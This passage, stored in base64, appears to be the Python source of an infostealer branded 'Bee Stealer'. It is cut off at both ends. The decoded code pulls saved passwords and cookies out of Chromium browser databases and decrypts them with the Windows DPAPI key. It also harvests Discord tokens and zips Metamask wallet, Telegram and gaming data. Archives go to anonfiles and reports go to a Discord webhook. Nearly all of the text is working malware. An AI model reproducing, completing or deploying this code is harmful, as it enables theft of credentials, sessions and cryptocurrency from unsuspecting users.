c2VybmFtZX0je2hhc2h0YWd9ICh7aWRkfSkiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJCZWUgU3RlYWxlciB8IEFyeGlmeSMwMDAxIiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgInRodW1ibmFpbCI6IHsKICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIiwKICAgICAgICAidXNlcm5hbWUiOiAiQmVlIFN0ZWFsZXIiLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgIyB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKSkKICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgpkZWYgUmVmb3JtYXQobGlzdHQpOgogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQogICAgd2hpbGUgImh0dHBzIiBpbiBlOiBlLnJlbW92ZSgiaHR0cHMiKQogICAgd2hpbGUgImNvbSIgaW4gZTogZS5yZW1vdmUoImNvbSIpCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikKICAgIHJldHVybiBsaXN0KHNldChlKSkKCmRlZiB1cGxvYWQobmFtZSwgbGluayk6CiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgaWYgbmFtZSA9PSAid3Bjb29rIjoKICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpCiAgICAgICAgaWYgbGVuKHJiKSA+IDEwMDA6IAogICAgICAgICAgICBycnJyciA9IFJlZm9ybWF0KHN0cihjb29raVdvcmRzKSkKICAgICAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAidGl0bGUiOiAiQmVlID4gQ29va2llcyBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIioqRm91bmQqKjpcbntyYn1cblxuKipEYXRhOioqXG46Y29va2llOiDigKIgKip7Q29va2lDb3VudH0qKiBDb29raWVzIEZvdW5kXG46bGluazog4oCiIFtCZWVDb29raWVzLnR4dF0oe2xpbmt9KSIsCiAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMzk0LAogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkJlZSBTdGVhbGVyIHwgQXJ4aWZ5IzAwMDEiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJCZWUgU3RlYWxlciIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KCiAgICBpZiBuYW1lID09ICJ3cHBhc3N3IjoKICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHBhc3dXb3JkcykKICAgICAgICBpZiBsZW4ocmEpID4gMTAwMDogCiAgICAgICAgICAgIHJyciA9IFJlZm9ybWF0KHN0cihwYXN3V29yZHMpKQogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikKCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBnbG9iYWxJbmZvKCksCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgInRpdGxlIjogIkJlZSA+IFBhc3N3b3JkIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCoqOlxue3JhfVxuXG4qKkRhdGE6KipcbvCflJEg4oCiICoqe1Bhc3N3Q291bnR9KiogUGFzc3dvcmRzIEZvdW5kXG46bGluazog4oCiIFtCZWVQYXNzd29yZHMudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAzOTQsCiAgICAgICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQmVlIFN0ZWFsZXIgfCBBcnhpZnkjMDAwMSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgInVzZXJuYW1lIjogIkJlZSBTdGVhbGVyIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKICAgIGlmIG5hbWUgPT0gImtpd2kiOgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgImNvbG9yIjogMzk0LAogICAgICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiSW50ZXJlc3RpbmcgZmlsZXMgZm91bmQgb24gdXNlciBQQzoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGxpbmsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJCZWUgPiBGaWxlIFN0ZWFsZXIiCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJCZWUgU3RlYWxlciB8IEFyeGlmeSMwMDAxIiwKICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgInVzZXJuYW1lIjogIkJlZSBTdGVhbGVyIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKCgojIGRlZiB1cGxvYWQobmFtZSwgdGs9JycpOgojICAgICBoZWFkZXJzID0gewojICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKIyAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgojICAgICB9CgojICAgICAjIHIgPSByZXF1ZXN0cy5wb3N0KGhvb2ssIGZpbGVzPWZpbGVzKQojICAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykKCmRlZiB3cml0ZWZvcmZpbGUoZGF0YSwgbmFtZSk6CiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgZi53cml0ZShmIjwtLVc0U1AgU1RFQUxFUiBPTiBUT1AtLT5cblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKClRva2VucyA9ICcnCmRlZiBnZXRUb2tlbihwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoICs9IGFyZwogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyNSwxMTB9IiwgciJtZmFcLltcdy1dezgwLDk1fSIpOgogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFRva2VucwogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwcmludCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkKClBhc3N3ID0gW10KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgUGFzc3csIFBhc3N3Q291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIFBhc3N3LmFwcGVuZChmIj09PT09PT09PT09PT09PT09PT09PT09PT09PT1cblVSTDoge3Jvd1swXX1cblVzZXJuYW1lOiB7cm93WzFdfVxuUGFzc3dvcmQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX1cbj09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQogICAgICAgICAgICBQYXNzd0NvdW50ICs9IDEKICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ3Bhc3N3JykKCkNvb2tpZXMgPSBbXSAgICAKZGVmIGdldENvb2tpZShwYXRoLCBhcmcpOgogICAgZ2xvYmFsIENvb2tpZXMsIENvb2tpQ291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCiAgICAKICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvQ29va2llcyIKICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCiAgICAKICAgIHRlbXBmb2xkID0gdGVtcCArICJ3cCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgogICAgCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgZW5jcnlwdGVkX3ZhbHVlIEZST00gY29va2llcyIpCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkKICAgIGN1cnNvci5jbG9zZSgpCiAgICBjb25uLmNsb3NlKCkKICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkKCiAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICAKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIGNvb2tpV29yZHM6IGNvb2tpV29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiI9PT09PT09PT09PT09PT09PT09PT09PT09PT09XG5Ib3N0OiB7cm93WzBdfVxuTmFtZToge3Jvd1sxXX1cblZhbHVlOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9XG49PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICAgICAgQ29va2lDb3VudCArPSAxCiAgICB3cml0ZWZvcmZpbGUoQ29va2llcywgJ2Nvb2snKQoKZGVmIEdldERpc2NvcmQocGF0aCwgYXJnKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntwYXRofS9Mb2NhbCBTdGF0ZSIpOiByZXR1cm4KCiAgICBwYXRoQyA9IHBhdGggKyBhcmcKCiAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQogICAgIyBwcmludChwYXRoLCBtYXN0ZXJfa2V5KQogICAgCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICAjIHByaW50KHBhdGgsIGZpbGUpCiAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLmxvZyIpIG9yIGZpbGUuZW5kc3dpdGgoIi5sZGIiKSAgIDoKICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwociJkUXc0dzlXZ1hjUTpbXi4qXFsnKC4qKSdcXS4qJF1bXlwiXSoiLCBsaW5lKToKICAgICAgICAgICAgICAgICAgICBnbG9iYWwgVG9rZW5zCiAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNvZGVkID0gRGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW5EZWNvZGVkKToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRva2VuRGVjb2RlZCBpbiBUb2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVG9rZW5zICs9IHRva2VuRGVjb2RlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyB3cml0ZWZvcmZpbGUoVG9rZW5zLCAndG9rZW5zJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuRGVjb2RlZCwgcGF0aCkKCmRlZiBHYXRoZXJaaXBzKHBhdGhzMSwgcGF0aHMyLCBwYXRoczMpOgogICAgdGh0dGh0ID0gW10KICAgIGZvciBwYXR0IGluIHBhdGhzMToKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHBhdHQgaW4gcGF0aHMyOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKICAgIAogICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRlbGVncmFtLCBhcmdzPVtwYXRoczNbMF0sIHBhdGhzM1syXSwgcGF0aHMzWzFdXSkKICAgIGEuc3RhcnQoKQogICAgdGh0dGh0LmFwcGVuZChhKQoKICAgIGZvciB0aHJlYWQgaW4gdGh0dGh0OiAKICAgICAgICB0aHJlYWQuam9pbigpCiAgICBnbG9iYWwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcAogICAgICAgICMgcHJpbnQoV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcCkKCiAgICB3YWwsIGdhLCBvdCA9ICIiLCcnLCcnCiAgICBpZiBub3QgbGVuKFdhbGxldHNaaXApID09IDA6CiAgICAgICAgd2FsID0gIjpjb2luOiAg4oCiICBXYWxsZXRzXG4iCiAgICAgICAgZm9yIGkgaW4gV2FsbGV0c1ppcDoKICAgICAgICAgICAgd2FsICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIKICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICBnYSA9ICI6dmlkZW9fZ2FtZTogIOKAoiAgR2FtaW5nOlxuIgogICAgICAgIGZvciBpIGluIEdhbWluZ1ppcDoKICAgICAgICAgICAgZ2EgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgaWYgbm90IGxlbihPdGhlclppcCkgPT0gMDoKICAgICAgICBvdCA9ICI6dGlja2V0czogIOKAoiAgQXBwc1xuIgogICAgICAgIGZvciBpIGluIE90aGVyWmlwOgogICAgICAgICAgICBvdCArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iICAgICAgICAgIAogICAgaGVhZGVycyA9IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQoKICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiBnbG9iYWxJbmZvKCksCiAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAidGl0bGUiOiAiQmVlID4gWmlwcyIsCiAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYie3dhbH1cbntnYX1cbntvdH0iLAogICAgICAgICAgICAiY29sb3IiOiAxMzksCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJCZWUgU3RlYWxlciB8IEFyeGlmeSMwMDAxIiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJ1c2VybmFtZSI6ICJCZWUgU3RlYWxlciIsCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgIH0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgoKZGVmIFppcFRlbGVncmFtKHBhdGgsIGFyZywgcHJvY2MpOgogICAgZ2xvYmFsIE90aGVyWmlwCiAgICBwYXRoQyA9IHBhdGgKICAgIG5hbWUgPSBhcmcKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybgogICAgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mID5udWwgMj4mMSIsIHNoZWxsPVRydWUpCgogICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoQyk6CiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlIGFuZCBub3QgInRkdW1teSIgaW4gZmlsZSBhbmQgbm90ICJ1c2VyX2RhdGEiIGluIGZpbGUgYW5kIG5vdCAid2VidmlldyIgaW4gZmlsZTogCiAgICAgICAgICAgIHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgIHpmLmNsb3NlKCkKCiAgICBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQojICAgICBsbmlrID0gImh0dHBzOi8vZ29vZ2xlLmNvbSIKICAgIG9zLnJlbW92ZShmIntwYXRoQ30ve25hbWV9LnppcCIpCiAgICBPdGhlclppcC5hcHBlbmQoW2FyZywgbG5pa10pCgpkZWYgWmlwVGhpbmdzKHBhdGgsIGFyZywgcHJvY2MpOgogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICBnbG9iYWwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcAogICAgIyBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQogICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpCgogICAgaWYgIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYiTWV0YW1hc2tfe2Jyb3dzZXJ9IgogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZwogICAgCiAgICBpZiBub3